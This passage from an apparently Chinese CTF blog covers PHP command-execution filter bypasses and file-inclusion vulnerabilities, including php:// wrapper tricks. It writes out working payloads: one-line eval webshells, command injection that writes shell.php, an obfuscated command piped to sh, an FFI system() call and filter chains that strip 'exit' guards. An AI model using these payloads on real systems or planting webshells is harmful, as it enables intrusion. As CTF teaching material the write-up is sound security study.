+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">w&gt;hp</span><br><span class="line">w&gt;1.p<span class="symbol">\w</span>&gt;d<span class="symbol">\&gt;</span><span class="symbol">\w</span>&gt;<span class="symbol">\ </span>-<span class="symbol">\w</span>&gt;e64<span class="symbol">\w</span>&gt;bas<span class="symbol">\w</span>&gt;7<span class="symbol">\|</span><span class="symbol">\w</span>&gt;XSk<span class="symbol">\w</span>&gt;Fsx<span class="symbol">\w</span>&gt;dFV<span class="symbol">\w</span>&gt;kX0<span class="symbol">\w</span>&gt;bCg<span class="symbol">\w</span>&gt;XZh<span class="symbol">\w</span>&gt;AgZ<span class="symbol">\w</span>&gt;waH<span class="symbol">\w</span>&gt;PD9<span class="symbol">\w</span>&gt;o<span class="symbol">\ </span><span class="symbol">\w</span>&gt;ech<span class="symbol">\l</span>s -t|sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>10)绕system(“ls”)</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#如果system(<span class="string">&quot;ls&quot;</span>)被过滤了</span><br><span class="line">可代php自带函数进行读取文件目录</span><br><span class="line">shana=var<span class="constructor">_dump(<span class="params">scandir</span>(“.”)</span>)?&gt;</span><br><span class="line">print<span class="constructor">_r(<span class="params">scandir</span>(&#x27;<span class="operator">/</span>&#x27;)</span>)</span><br><span class="line">var<span class="constructor">_export(<span class="params">scandir</span>(<span class="string">&quot;/&quot;</span>)</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>globx协议:查找匹配的文件路径模式</p>
+<p><img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220226232717445.png" alt="image-20220226232717445"></p>
+<h3 id="没字母数字RCE"><a href="#没字母数字RCE" class="headerlink" title="没字母数字RCE"></a>没字母数字RCE</h3><p>类型</p>
+<p>①不用数字构造出数字类型<br>②不用数字和字母的shell<br>③非字母,数字的字符异或出字母<br>④非字母、数字的字符取反出字母<br>⑤php递增／递减运算符构造出shell<br>⑥不用数字字母下划线和$的shell–&gt;即典型短标签的思路(即直接在短标签中构造常见的shell命令即可)</p>
+<p>基础知识点</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">短标签</span></span><br><span class="line"><span class="xml">#如</span></span><br><span class="line"><span class="xml"></span><span class="php"><span class="meta">&lt;?=</span>`ls /`;<span class="meta">?&gt;</span></span><span class="xml">      # 等效于</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `ls /`; <span class="meta">?&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml">原理:</span><span class="php"><span class="meta">&lt;?=</span> 是 <span class="keyword">echo</span>() 的别名用法</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span><span class="php"><span class="meta">&lt;?=</span>`ls`;   <span class="comment">#构造原因&lt;?= 还是不够的，需要先 ?&gt;</span></span><span class="xml"> 把前面的 </span><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">临时文件上传</span></span><br><span class="line"><span class="php"><span class="comment">#原理:们都知道php文件上传时，一般是将文件上传到临时目录，然后再将临时目录移到其它地方</span></span></span><br><span class="line"><span class="php"><span class="comment">#php.ini中的两个参数</span></span></span><br><span class="line"><span class="php">file_uploads 是否允许上传</span></span><br><span class="line"><span class="php">upload_tmp_dir 是默认的临时文件的保存目录（linux默认为/tmp）</span></span><br><span class="line"><span class="php"><span class="comment">#临时文件保存形式</span></span></span><br><span class="line"><span class="php">默认为 php+<span class="number">4</span>或者<span class="number">6</span>位随机数字和大小写字母</span></span><br><span class="line"><span class="php">如</span></span><br><span class="line"><span class="php">phpXXXXXX.tmp 在windows下有tmp后缀，linux没有。</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">?c=.+/???/????????[@-[]</span></span><br><span class="line"><span class="php">+:空格的意思，也可以用空格编码%<span class="number">20</span> 空格 + %<span class="number">20</span> 都可以表示空格</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="number">123</span>为<span class="number">1</span>.txt的内容  然后在上传文件内容添加sh命令          </span></span><br><span class="line"><span class="php"><span class="comment">#!/bin/sh</span></span></span><br><span class="line"><span class="php">ls</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">linux命令执行的另外一种方式</span></span><br><span class="line"><span class="php">原理:linux环境下执行命令可以以文件形式存在</span></span><br><span class="line"><span class="php">如aa.txt文件中--&gt;cat /etc/passwd</span></span><br><span class="line"><span class="php">即可./aa.txt执行这个命令</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">linux通配符</span></span><br><span class="line"><span class="php"></span></span><br></pre></td></tr></table></figure>
+
+<p>临时文件上传</p>
+<p><img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220226234043869.png" alt="image-20220226234043869"></p>
+<p>一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。</p>
+<p>可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。<code>$(())</code>的值是0   如果b=<del>a，那么a+b=-1。若a=0,</del>0=-1</p>
+<p>$((~$(())))   ~0=-1</p>
+<h3 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h3><p><strong>无参数</strong>的意思可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,’c’)，<strong>不能带参数</strong></p>
+<p><strong>print_r(scandir(‘.’))</strong></p>
+<p>可以用来查看当前目录所有文件名</p>
+<p>但是我们这里说的是要构造无参数的函数，所以我们要做的就是去掉这个点号</p>
+<p>​         <strong>scandir() 函数返回指定目录中的文件和目录的数组</strong></p>
+<ul>
+<li>localeconv()  函数返回一包含本地数字及货币格式信息的数组。</li>
+<li>current()        函数返回数组中的当前元素（单元）,默认取第一个值，</li>
+<li>pos() 同 current()  ,是current()的别名</li>
+<li>reset()   函数返回数组第一个单元的值，如果数组为空则返回 FALSE</li>
+<li>array_reverse()逆转数组函数</li>
+<li>next()函数进行下一个值的读取</li>
+<li>ord()返回字符串中第一个字符的Ascii值</li>
+<li><img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220124140605804.png" alt="image-20220124140605804"></li>
+<li>readgzfile()也可读文件，常用于绕过过滤</li>
+<li>dirname() ：返回路径中的目录部分</li>
+<li>chdir() ：改变当前工作目录</li>
+<li>array_flip() 函数用于反转/交换数组中的键名和对应关联的键值。</li>
+<li>array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</li>
+<li>show_source() 函数对文件进行语法高亮显示。</li>
+<li>highlight_file() 函数对文件进行语法高亮显示。</li>
+<li>readfile() 函数读取一个文件，并写入到输出缓冲。</li>
+</ul>
+<p>​         **localeconv() ** 函数 返回数组的第一项就是 .  (小数点)<img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220124144510476.png" alt="image-20220124144510476"></p>
+<p>我们可以通过读取该小数点代替print_r(scandir(‘.’))中的小数点 ，读取数组第一项可以的函数有current()、pos() 、reset()</p>
+<p>所以最终我们可以构造如下：查看当前目录所有文件名</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>())));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">pos</span>(<span class="title">localeconv</span>())));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">reset</span>(<span class="title">localeconv</span>())));</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print<span class="constructor">_r(<span class="params">scandir</span>(<span class="params">dirname</span>(<span class="params">getcwd</span>()</span>))); <span class="comment">//查看上一级目录的文件</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-综合利用类"><a href="#0x04-综合利用类" class="headerlink" title="0x04 综合利用类"></a>0x04 综合利用类</h2><p>典型拼接写木马</p>
+<p>利用拼接执行写一句话木马</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">127.0.0.1 &amp;echo &quot;</span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(\<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="xml">&quot; &gt;&gt; shell.php#没过滤空格和典型的关键字时可用</span></span><br><span class="line"><span class="xml">127.0.0.1 | cat 3122542822583.php |base64#即拼接进行base64显示,典型用于直接cat不出来的情况下</span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="命令执行无回显绕过"><a href="#命令执行无回显绕过" class="headerlink" title="命令执行无回显绕过"></a>命令执行无回显绕过</h3><p><strong>&gt;/dev/null 2&gt;&amp;1</strong>主要意思是不进行回显的意思</p>
+<p><strong>1、可以将/dev/null看作”黑洞”. 它非常等价于一个只写文件. 所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. 然而, /dev/null对命令行和脚本都非常的有用.</strong><br>用处:<br>禁止标准输出.  1 cat $filename &gt;/dev/null  # 文件内容丢失，而不会输出到标准输出.<br>禁止标准错误.   2&gt;/dev/null 这样错误信息[标准错误]就被丢到太平洋去了. </p>
+<p><strong>2、1&gt;/dev/null 2&gt;&amp;1的含义</strong> </p>
+<p>&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于”1&gt;/dev/null”<br>2 表示stderr标准错误<br>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1 </p>
+<p><strong>那么:</strong><br>1&gt;/dev/null 首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。<br>2&gt;&amp;1 接着，标准错误输出重定向等同于 标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。 </p>
+<p>3、/dev/zero文件代表一个永远输出 0的设备文件，使用它作输入可以得到全为空的文件。因此可用来创建新文件和以覆盖的方式清除旧文件。 </p>
+<p>下面使用dd命令将从zero设备中创建一个10K大小（bs决定每次读写1024字节，count定义读写次数为10次），但内容全为0的文件。<br>dd if=/dev/zero of=file count=10 bs=1024</p>
+<p> shell中可能经常能看到：<a target="_blank" rel="noopener" href="http://sjolzy.cn/shell-in-the-dev-null-2-gt-amp-1-Detailed.html">&gt;/dev/null 2&gt;&amp;1</a> </p>
+<p>命令的结果可以通过%&gt;的形式来定义输出</p>
+<p>分解这个组合：“&gt;/dev/null 2&gt;&amp;1” 为五部分。</p>
+<p>1：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>2：/dev/null 代表空设备文件<br>3：2&gt; 表示stderr标准错误<br>4：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1<br>5：1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于 “1&gt;/dev/null”</p>
+<p><strong>因此，&gt;<a target="_blank" rel="noopener" href="http://sjolzy.cn/shell-in-the-dev-null-2-gt-amp-1-Detailed.html">/dev/null 2&gt;&amp;1</a> 也可以写成“1&gt; /dev/null 2&gt; &amp;1”</strong></p>
+<p>要让命令回显，那么进行命令分隔即可</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;	<span class="regexp">//</span>分号</span><br><span class="line">|	<span class="regexp">//</span>只执行后面那条命令</span><br><span class="line">||	<span class="regexp">//</span>只执行前面那条命令</span><br><span class="line">&amp;	<span class="regexp">//</span>两条命令都会执行</span><br><span class="line">&amp;&amp;	<span class="regexp">//</span>两条命令都会执行</span><br></pre></td></tr></table></figure>
+
+<h2 id="其他姿势："><a href="#其他姿势：" class="headerlink" title="其他姿势："></a>其他姿势：</h2><p>include 无法使用，可以使用一些可使用的进程去读取flag。这里使用PDO(PHP Database Object)去执行sql语句进而读出flag，payload如下：</p>
+<p>c=try {$dbh = new PDO(‘mysql:host=localhost;dbname=ctftraining’, ‘root’, ‘root’);foreach($dbh-&gt;query(‘select load_file(“/flag36.txt”)’) as $row) {echo($row[0]).”|”; }$dbh = null;}catch (PDOException $e) {echo $e- &gt;getMessage();<strong>exit</strong>(0);}<strong>exit</strong>(0);</p>
+<p>在<strong>PDO</strong>中，我们可以使用三种方式来执行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020">SQL语句</a>，分别是 exec()方法，query方法，以及预处理语句prepare()和execute()方法</p>
+<p><img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220220163455540.png" alt="image-20220220163455540"></p>
+<p>exec()方法返回执行SQL 语句后受影响的行数，其语法格式如下：</p>
+<p>参数 satatement 是要执行的SQL语句，该方法返回执行SQL 语句时受影响的行数，通常用于 INSERT，DELETE和UPDATE语句中</p>
+<p>query()方法用于返回执行查询后的结果集，该函数的语法格式如下如下：</p>
+<p>参数 satatement 是要执行的 SQL语句，它返回的是一个PODStatement对象！</p>
+<p>注意:</p>
+<p>1、query和exec都可以执行所有的sql语句，只是返回值不同而已。</p>
+<p>2、query可以实现所有exec的功能。</p>
+<p>3、当把select语句应用到 exec 时，总是返回 0</p>
+<p>4、如果要看查询的具体结果，可以通过foreach语句完成循环输出</p>
+<p>第三种种方法：预处理语句：prepare()语句和execute()语句</p>
+<p>预处理语句包括prepare()和execute()两种方法。首先，通过prepare()方法做查询准备工作，然后通过execute()方法执行查询，并且还可以通过bindParam()方法来绑定参数给execute()方法</p>
+<p><strong>php中的“-&gt;”符号</strong>被称为箭头<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%BF%90%E7%AE%97%E7%AC%A6&spm=1001.2101.3001.7020">运算符</a>，箭头运算符左侧是获取类的实例，右侧将指定左侧类的方法和属性并进行<strong>调用</strong></p>
+<p><strong>FFI</strong></p>
+<p>外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。 </p>
+<p>FFI的使用非常简单，只用声明和调用两步就可以，对于有C语言经验，但是不了解Zend引擎的程序员来说，这简直是打开了新世界的大门，可以快速地使用C类库进行原型试验</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/133809650">https://zhuanlan.zhihu.com/p/133809650</a></p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);</span><br><span class="line">readflag是专门用来读flag的。然后访问`/<span class="number">1</span>.txt`即可</span><br></pre></td></tr></table></figure>
+
+<p>system函数：<br>原型：int system(const char * command)；<br>功能：执行 dos(windows系统) 或 shell(Linux/Unix系统) 命令，参数字符串command为命令名;<br>说明：在windows系统中，system函数直接在控制台调用一个command命令。在Linux/Unix系统中，system函数会调用fork函数产生子进程，由子进程来执行command命令，命令执行完后随即返回原调用的进程；</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CJ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Echo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">CTF文件包含漏洞总结</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-02-26 22:05:49" itemprop="dateCreated datePublished" datetime="2022-02-26T22:05:49+08:00">2022-02-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-02-27 22:04:55" itemprop="dateModified" datetime="2022-02-27T22:04:55+08:00">2022-02-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Symbols count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Symbols count in article: </span>
+      <span>6.4k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>6 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="0x01-什么是文件包含漏洞"><a href="#0x01-什么是文件包含漏洞" class="headerlink" title="0x01 什么是文件包含漏洞"></a>0x01 什么是文件包含漏洞</h2><p>通过<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=PHP&spm=1001.2101.3001.7020">PHP</a>函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。</p>
+<h2 id="0x02-文件包含漏洞的环境要求"><a href="#0x02-文件包含漏洞的环境要求" class="headerlink" title="0x02 文件包含漏洞的环境要求"></a>0x02 文件包含漏洞的环境要求</h2><p>allow_url_fopen=On(默认为On) 规定是否允许从远程服务器或者网站检索数据</p>
+<p>allow_url_include=On(php5.2之后默认为Off) 规定是否允许include/require远程文件</p>
+<h2 id="0x03-常见文件包含函数"><a href="#0x03-常见文件包含函数" class="headerlink" title="0x03 常见文件包含函数"></a>0x03 常见文件包含函数</h2><p>php中常见的文件包含函数有以下四种：</p>
+<pre><code>include()
+require()
+include_once()
+require_once()
+</code></pre>
+<p>include与require基本是相同的，除了错误处理方面:</p>
+<pre><code>include()，只生成警告（E_WARNING），并且脚本会继续
+require()，会生成致命错误（E_COMPILE_ERROR）并停止脚本
+include_once()与require_once()，如果文件已包含，则不会包含，其他特性如上
+</code></pre>
+<h2 id="0x04-PHP伪协议"><a href="#0x04-PHP伪协议" class="headerlink" title="0x04 PHP伪协议"></a>0x04 PHP伪协议</h2><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<p>一、php://input</p>
+<p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。<br><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221106381.png" alt="image-20220226221106381"></p>
+<p>注：利用php://input还可以写入php木马,即在post中传入如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>二、php://filter</p>
+<p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221326310.png" alt="image-20220226221326310"></p>
+<p>POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<h3 id="php-filter的妙用"><a href="#php-filter的妙用" class="headerlink" title="php://filter的妙用"></a>php://filter的妙用</h3><p>XXE中的使用</p>
+<p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。</p>
+<p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。</p>
+<p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title"><span class="built_in">readfile</span></span>(<span class="string">&quot;php://filter/read=convert.base64-encode/resource=php://input&quot;</span>);</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220227215417879.png" alt="image-20220227215417879"></p>
+<p>所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。</p>
+<p>如下，我们使用的是<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/thum-693b1469385893.png"></p>
+<p><strong>巧用编码与解码</strong></p>
+<p>使用编码不光可以帮助我们获取文件，也可以帮我们去除一些“不必要的麻烦”。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p>
+<p>幸运的是，这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
+<p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
+<p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = preg_replace(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line">base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode  来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
+<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220227220004241.png" alt="image-20220227220004241"></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#_2">利用字符串操作方法</a></p>
+<p>有的同学说，base64的算法我不懂，上面的方法太复杂了。</p>
+<p>其实，除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除“死亡exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p>
+<p>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p>
+<p>编写如下测试代码即可查看 php://filter/read=string.strip_tags/resource=php://input 的效果：</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo readfile(&#x27;php<span class="symbol">://filter/read=string</span>.strip_tags/resource=php<span class="symbol">://input</span>&#x27;)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/thum-499a1469385895.png" alt="QQ截图20160725010403.png"></p>
+<p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p>
